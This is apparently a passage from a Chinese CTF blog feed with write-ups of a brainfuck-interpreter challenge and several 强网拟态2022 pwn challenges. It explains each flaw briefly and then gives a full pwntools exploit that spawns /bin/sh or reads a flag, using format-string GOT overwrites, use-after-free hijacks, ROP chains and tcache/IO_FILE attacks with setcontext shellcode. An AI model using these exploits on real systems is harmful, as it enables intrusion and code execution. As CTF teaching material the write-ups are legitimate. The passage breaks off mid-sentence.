/><ol><li><p>rbp-0A8中的值(0x7ffc6a1b48d0)加1</p></li><li><p>rbp-0B0中的值(0x562b3853e261)加1</p></li><li><p>eax赋上地址0x562b3853e261中的值(1字节) </p></li><li><p>mov  rax, [rbp+rax*8-80h]   （rax赋上v3数组的函数地址，rax  &#x3D;  v3[rax]）</p></li><li><p>jmp     rax</p></li></ol><p>再对照函数sub_16F6伪代码就可以知道函数的作用了</p><p><img src="/img/7/Screenshot_20221230_042441.png"></p><p>​                              </p><p>实际上<code>rbp-0A8</code>就是bf解释器的指针，<code>rbp-0B0</code>中储存着下一指令，所以这些函数作用如下：</p> <img src="/img/7/Screenshot_20221230_043330.png" style="zoom:80%;" /><h4 id="字符转化"><a href="#字符转化" class="headerlink" title="字符转化"></a>字符转化</h4><p>这道题并没有直接给你<code>&quot;&gt;  &lt;  ,  .&quot;</code> 这些字符，而是在你输入一段字符后，又去使用dword_2020数组进行一步转化</p><img src="/img/7/Screenshot_20221230_034137.png" style="zoom: 80%;" /><p>dword_2020数组部分内容如下：</p><img src="/img/7/Screenshot_20221230_032203.jpg" style="zoom:67%;" /><p>​                                                                                           </p><p>规律如下：[输入的值(ascii码)&#x3D;&gt;转化后的值]</p><p><code>[0=&gt;8][1=&gt;9][43=&gt;2][44=&gt;5][45=&gt;3][46=&gt;4][60=&gt;0][62=&gt;1][91=&gt;6][93=&gt;7]</code></p><p>输入的值是字符，在内存中以ascii码储存，转化后的值又是对应v3数组中的引索。</p><p>例如字符<code>&#39;&gt;&#39;</code>的ascii码为62，转化后的值为1，最后对应v3[1]中函数的执行。</p><h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>虽然这道题不像pwnable_bf中很直接给出bf解释器的操作，但是经过一系列转化后也同样达到了bf解释器的效果。</p><p>操作的指针是<code>rbp-0A8</code>，其里面的值也是栈上的值，也就是可以对栈上任意值读写，所以泄漏__libc_start_main函数地址后直接ROP</p><p>完整exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;chall&#x27;</span>)<br>libc = elf.libc<br>p = process(<span class="hljs-string">&#x27;./chall&#x27;</span>)<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getchar</span>(<span class="hljs-params">gadget</span>):<br>    l = <span class="hljs-built_in">len</span>(gadget)<br>    gadget = <span class="hljs-built_in">int</span>.from_bytes(gadget, byteorder=<span class="hljs-string">&#x27;little&#x27;</span>, signed=<span class="hljs-literal">True</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(l):<br>        t = gadget &amp; <span class="hljs-number">0xff</span><br>        gadget = gadget &gt;&gt; <span class="hljs-number">8</span><br>        p.send(p8(t))<br><br><span class="hljs-comment">#s = [0,8][1,9][43,2][44,5][45,3][46,4][60,0][62,1][91,6][93,7]</span><br><br>p.sendlineafter(<span class="hljs-string">b&#x27;len&gt;&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">0x100</span>).encode())<br>payload = <span class="hljs-string">b&#x27;&gt;&#x27;</span> * <span class="hljs-number">0x58</span> + (<span class="hljs-string">b&#x27;.&#x27;</span> + <span class="hljs-string">b&#x27;&gt;&#x27;</span>) * <span class="hljs-number">8</span> + <span class="hljs-string">b&#x27;&lt;&#x27;</span> * <span class="hljs-number">0x28</span> + (<span class="hljs-string">b&#x27;,&#x27;</span> + <span class="hljs-string">b&#x27;&gt;&#x27;</span>) * <span class="hljs-number">0x20</span><br>p.sendafter(<span class="hljs-string">b&#x27;code&gt;&#x27;</span>, payload)<br>leak =  u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libcbase = leak - <span class="hljs-number">231</span> - libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>sys_addr = libcbase + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh = libcbase + libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>).__next__()<br>pop_rdi = libcbase + <span class="hljs-number">0x2164f</span><br>ret = libcbase + <span class="hljs-number">0x8aa</span><br><br>payload = p64(ret) + p64(pop_rdi) + p64(bin_sh) + p64(sys_addr)<br>getchar(payload)<br><span class="hljs-comment">#pause()</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="强网拟态bfbf"><a href="#强网拟态bfbf" class="headerlink" title="强网拟态bfbf"></a>强网拟态bfbf</h3><p><a href="https://xtxtn.github.io/2022/11/19/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812022/#bfbf">强网拟态2022pwn - xtxtn’s Blog</a></p><p>​                            </p><p>​                       </p><p>​                  </p><p>参考：<a href="https://zh.wikipedia.org/wiki/Brainfuck">Brainfuck - 维基百科，自由的百科全书 (wikipedia.org)</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>强网拟态2022pwn</title>
    <link href="/2022/11/19/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812022/"/>
    <url>/2022/11/19/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812022/</url>
    
    <content type="html"><![CDATA[<h3 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h3><p>直接利用格式化字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;pwn1&#x27;</span>)<br>p = process(<span class="hljs-string">&#x27;./pwn1&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>p.sendline(<span class="hljs-string">b&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>elfbase = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>) - elf.sym[<span class="hljs-string">&#x27;func&#x27;</span>]<br><br>printf_got = elfbase + elf.got[<span class="hljs-string">&#x27;printf&#x27;</span>]<br>system_plt = elfbase + elf.plt[<span class="hljs-string">&#x27;system&#x27;</span>]<br>payload = fmtstr_payload(<span class="hljs-number">8</span>, &#123;printf_got:system_plt&#125;,write_size=<span class="hljs-string">&#x27;byte&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;2&#x27;</span>)<br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br>p.sendafter(<span class="hljs-string">b&#x27;hello\n&#x27;</span>, payload)<br><span class="hljs-comment">#pause()</span><br>p.send(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="pwn2-1"><a href="#pwn2-1" class="headerlink" title="pwn2-1"></a>pwn2-1</h3><p>存在uaf，且print_note函数是通过引用堆块上print_note_content函数的地址来实现，修改堆上print_note_content函数的地址为magic函数地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;pwn2-1&#x27;</span>)<br>p = process(<span class="hljs-string">&#x27;./pwn2-1&#x27;</span>)<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;:&#x27;</span>, content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">printf</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;:&#x27;</span>, <span class="hljs-string">b&#x27;5&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>elfbase = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>) - <span class="hljs-number">0x11f0</span><br><br>add(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">0</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>delete(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x10</span>, p64(elfbase + elf.sym[<span class="hljs-string">&#x27;magic&#x27;</span>]))<br>printf(<span class="hljs-number">0</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="bfbf"><a href="#bfbf" class="headerlink" title="bfbf"></a>bfbf</h3><p>bf解释器类型的题</p><p>通过输入的‘&gt;&lt;+-‘等这些符号可以对栈上v3的数据进行读写，而且没有对偏移量进行限制，这就可以对栈上的任意数据读写。</p><img src="/img/6/Screenshot_20221130_051449.png" style="zoom: 80%;" /><p>打印出<code>__libc_start_main</code>函数的地址，减去相应的偏移就可得到libc的基地址，利用libc找到相应的gadget，再覆盖栈上<code>__libc_start_main</code>的地址，直接ROP。</p><p>程序开启沙盒对read函数的第一个参数进行了限制，我们无法直接orw读取flag文件中的信息，这里改用sendfile函数即可。</p><img src="/img/6/Screenshot_20221130_053546.png" style="zoom: 80%;" /><p>​</p><p>完整exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-comment">#libc = elf.libc</span><br>libc = ELF(<span class="hljs-string">&#x27;libc.so.6&#x27;</span>)<br>p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getchar</span>(<span class="hljs-params">gadget</span>):<br>    l = <span class="hljs-built_in">len</span>(gadget)<br>    gadget = <span class="hljs-built_in">int</span>.from_bytes(gadget, byteorder=<span class="hljs-string">&#x27;little&#x27;</span>, signed=<span class="hljs-literal">True</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(l):<br>        t = gadget &amp; <span class="hljs-number">0xff</span><br>        gadget = gadget &gt;&gt; <span class="hljs-number">8</span><br>        p.send(p8(t))<br><br><span class="hljs-comment">#gdb.attach(p)</span><br><span class="hljs-comment">#pause()</span><br>payload = <span class="hljs-string">b&#x27;&gt;&#x27;</span> * <span class="hljs-number">0x210</span> + (<span class="hljs-string">b&#x27;.&#x27;</span> + <span class="hljs-string">b&#x27;&gt;&#x27;</span>) * <span class="hljs-number">6</span> + <span class="hljs-string">b&#x27;&gt;&#x27;</span> * <span class="hljs-number">0x22</span> + (<span class="hljs-string">b&#x27;.&#x27;</span> + <span class="hljs-string">b&#x27;&gt;&#x27;</span>) * <span class="hljs-number">6</span> + <span class="hljs-string">b&#x27;&lt;&#x27;</span> * <span class="hljs-number">6</span><br>payload += (<span class="hljs-string">b&#x27;,&#x27;</span> + <span class="hljs-string">b&#x27;&gt;&#x27;</span>) * <span class="hljs-number">8</span> * <span class="hljs-number">20</span><br>p.sendafter(<span class="hljs-string">b&#x27;&gt;&gt;\n&#x27;</span>, payload)<br><br>stack_addr = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>leak = u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(stack_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(leak))<br><br>libcbase = leak - <span class="hljs-number">243</span> - libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>pop_rdi = libcbase + <span class="hljs-number">0x23b6a</span><br>pop_rsi = libcbase + <span class="hljs-number">0x2601f</span><br>pop_rdx = libcbase + <span class="hljs-number">0x142c92</span><br>pop_rcx_rbx = libcbase + <span class="hljs-number">0x10257e</span><br>pop_rax = libcbase + <span class="hljs-number">0x36174</span><br>syscall_ret = libcbase + <span class="hljs-number">0x630a9</span><br><br><span class="hljs-comment">#open(‘flag&#x27;)</span><br><span class="hljs-comment">#sendfile(1,fd,0,0x100)</span><br>payload = flat(<br>    p64(pop_rdi), p64(stack_addr + <span class="hljs-number">0xa0</span>),<br>    p64(pop_rsi), p64(<span class="hljs-number">0</span>),<br>    p64(pop_rax), p64(<span class="hljs-number">2</span>),<br>    p64(syscall_ret),<br><br>    p64(pop_rdi), p64(<span class="hljs-number">1</span>),<br>    p64(pop_rsi), p64(<span class="hljs-number">3</span>),<br>    p64(pop_rdx), p64(<span class="hljs-number">0</span>),<br>    p64(pop_rcx_rbx), p64(<span class="hljs-number">0x100</span>), p64(<span class="hljs-number">0</span>),<br>    p64(pop_rax), p64(<span class="hljs-number">40</span>),<br>    p64(syscall_ret)<br>)<br>payload += <span class="hljs-string">b&#x27;flag&#x27;</span>.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>getchar(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>改用readv函数也可以读取flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#open(&#x27;flag&#x27;)</span><br><span class="hljs-comment">#readv(3, iovec, 1)</span><br><span class="hljs-comment">#writev(1, iovec, 1)</span><br>payload = flat(<br>    p64(pop_rdi), p64(stack_addr + <span class="hljs-number">0xd0</span>),<br>    p64(pop_rsi), p64(<span class="hljs-number">0</span>),<br>    p64(pop_rax), p64(<span class="hljs-number">2</span>),<br>    p64(syscall_ret),<br><br>    p64(pop_rdi), p64(<span class="hljs-number">3</span>),<br>    p64(pop_rsi), p64(stack_addr + <span class="hljs-number">0xd8</span>),<br>    p64(pop_rdx), p64(<span class="hljs-number">1</span>),<br>    p64(pop_rax), p64(<span class="hljs-number">19</span>),<br>    p64(syscall_ret),<br>    <br>    p64(pop_rdi), p64(<span class="hljs-number">1</span>),<br>    p64(pop_rsi), p64(stack_addr + <span class="hljs-number">0xd8</span>),<br>    p64(pop_rdx), p64(<span class="hljs-number">1</span>),<br>    p64(pop_rax), p64(<span class="hljs-number">20</span>),<br>    p64(syscall_ret)<br>)<br>payload += <span class="hljs-string">b&#x27;flag&#x27;</span>.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(stack_addr + <span class="hljs-number">0xf0</span>) + p64(<span class="hljs-number">0x30</span>)<br></code></pre></td></tr></table></figure><p>也可以使用close函数先关闭标准输入<code>close(0)</code>，再直接orw，这里就不再展示了。</p><h3 id="only"><a href="#only" class="headerlink" title="only"></a>only</h3><p>本地环境：2.31-0ubuntu9_amd64</p><p>程序在开始时就已经有很多堆块已经被分配释放了（通过动态链接库libseccomp.so.2引入沙盒规则导致的）</p><img src="/img/6/Screenshot_20221201_090534.png" style="zoom: 67%;" /><p>​                                                                                                      </p><p>使用increase函数是对堆块的申请，次数限制为11次；使用decresae函数是释放堆块，次数限制为4次，虽然有uaf，但程序没有edit函数和show函数这种功能，无法对uaf完成有效利用，唯一可以利用的是initial函数，还只能使用一次</p><img src="/img/6/Screenshot_20221201_091349.png" style="zoom:67%;" /><p>如果已经完成了一次堆块的申请并且释放，在此过程就将tcache中的<code>tcache_perthread_struct *key</code>破坏，配合uaf就可以实现tcache的double free。由于申请堆块的大小，释放次数这些限制，我们无法一次性泄漏出libc的基地址。</p><p>在完成double free后，劫持到tcache的结构体头部，就可以直接控制tcache的申请和数量。直接释放tcache的结构体头部得到unsorted bin后，攻击<code>_IO_2_1_stdout_</code>以实现libc基地址的泄漏：</p><img src="/img/6/Screenshot_20221201_102237.jpg" style="zoom: 67%;" /><p>​</p><p>沙盒的存在无法直接拿到shell，需要利用<code>mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]</code>和setcontext劫持rsp，执行ROP或者shellcode。</p><p>在此过程中需要爆破两次地址，有1&#x2F;256的概率拿到flag，在本地运行时可以加上 aslr&#x3D;False，节省本地爆破的时间。</p><p>完整exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;only&#x27;</span>)<br>libc = elf.libc<br><span class="hljs-keyword">global</span> p<br><span class="hljs-comment">#p = process(&#x27;./only&#x27;, aslr=False)</span><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">initial</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choice &gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;0&#x27;</span>)<br>    <span class="hljs-comment">#p.sendlineafter(b&#x27;Size:&#x27;, str(size).encode())</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">increase</span>(<span class="hljs-params">size, content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choice &gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Size:&#x27;</span>, <span class="hljs-built_in">str</span>(size).encode())<br>    p.sendafter(<span class="hljs-string">b&#x27;Content:&#x27;</span>, content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decresae</span>():<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Choice &gt;&gt;&#x27;</span>, <span class="hljs-string">b&#x27;2&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br>    increase(<span class="hljs-number">0x70</span>, <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>    decresae()<br>    initial()<br>    decresae()<br>    increase(<span class="hljs-number">0x70</span>, <span class="hljs-string">b&#x27;\x10\xc0&#x27;</span> + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>    increase(<span class="hljs-number">0x70</span>, <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>    payload = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p16(<span class="hljs-number">1</span>) + p16(<span class="hljs-number">1</span>)  + p32(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">5</span> + p32(<span class="hljs-number">0</span>) + p16(<span class="hljs-number">0</span>) + p16(<span class="hljs-number">7</span>)<br>    increase(<span class="hljs-number">0x70</span>, payload + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br><br>    decresae()<br>    increase(<span class="hljs-number">0x80</span>, <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>    increase(<span class="hljs-number">0x40</span>, <span class="hljs-string">b&#x27;\xa0\x56&#x27;</span> + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>    increase(<span class="hljs-number">0x30</span>, p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span> + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>    leak =  u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>, timeout=<span class="hljs-number">1</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    libcbase = leak - libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdin_&#x27;</span>]<br>    free_hook = libcbase + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>    stdout = libcbase + libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]<br>    mp = libcbase + <span class="hljs-number">2011848</span><br>    magic_gadget = libcbase + <span class="hljs-number">0x1547a0</span><br>    setcontext = libcbase + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>    pop_rdi = libcbase + <span class="hljs-number">0x26b72</span><br>    pop_rsi = libcbase + <span class="hljs-number">0x27529</span><br>    pop_rdx_r12 = libcbase + <span class="hljs-number">0x11c1e1</span><br>    pop_rax = libcbase + <span class="hljs-number">0x4a550</span><br>    ret = libcbase + <span class="hljs-number">0x25679</span><br>    mprotect = libcbase + libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br><br>    increase(<span class="hljs-number">0x40</span>, p64(free_hook) + p64(stdout) + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>    increase(<span class="hljs-number">0xd0</span>, p64(magic_gadget) + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>    increase(<span class="hljs-number">0xe0</span>, p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">3</span> + p64(mp) + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>    heap_addr = u64(p.recv(<span class="hljs-number">8</span>))<br><br><br>    payload = p64(<span class="hljs-number">0</span>) + p64(heap_addr + <span class="hljs-number">0x140</span>) + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(setcontext + <span class="hljs-number">61</span>)<br>    payload += p64(pop_rdi) + p64(heap_addr) + p64(pop_rsi) + p64(<span class="hljs-number">0x1000</span>) + p64(pop_rdx_r12) + p64(<span class="hljs-number">7</span>) + p64(<span class="hljs-number">0</span>) + p64(mprotect) + p64(heap_addr + <span class="hljs-number">0x140</span> +<span class="hljs-number">0x70</span>)<br>    payload += asm(shellcraft.cat(<span class="hljs-string">&#x27;flag&#x27;</span>))<br>    payload = payload.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    payload += p64(heap_addr + <span class="hljs-number">0x140</span> + <span class="hljs-number">0x28</span>) + p64(ret)<br><br>    increase(<span class="hljs-number">0xe0</span>, payload + <span class="hljs-string">b&#x27;\n&#x27;</span>)<br>    <span class="hljs-comment">#gdb.attach(p)</span><br>    <span class="hljs-comment">#pause()</span><br>    decresae()<br>    p.interactive()<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span> :<br>    <span class="hljs-keyword">try</span> :<br>        p = process(<span class="hljs-string">&#x27;./only&#x27;</span>)<br>        pwn()<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        p.close()<br></code></pre></td></tr></table></figure><p>​                                                     </p><p>​                        </p><h3 id="store"><a href="#store" class="headerlink" title="store"></a>store</h3><p>程序只能使用两次申请堆块，虽然后续也能申请，但无法去使用；留了一个uaf的漏洞，free的次数也只能是4次，edit和show这种函数可以正常使用。如果使用tcache去实现任意写，这两次申请是远远不够用的。这里是使用house of apple2，主要就是利用一次largebin attack攻击去实现劫持IO控制流。</p><p>Roderick师傅的文章已经很详细了：[<a href="https://bbs.pediy.com/thread-273832.htm">原创] House of apple 一种新的glibc中IO攻击方法 (2)-Pwn-看雪论坛-安全社区|安全招聘|bbs.pediy.com</a></p><p>​</p><p>当然构造IO_FILE也需要注意<code>_IO_flush_all_lockp</code>函数中的if判断：</p><img src="/img/6/Screenshot_20230103_111938.png" style="zoom: 67%;" /><p>满足前者<code>fp-&gt;_mode &lt;= 0 &amp;&amp; 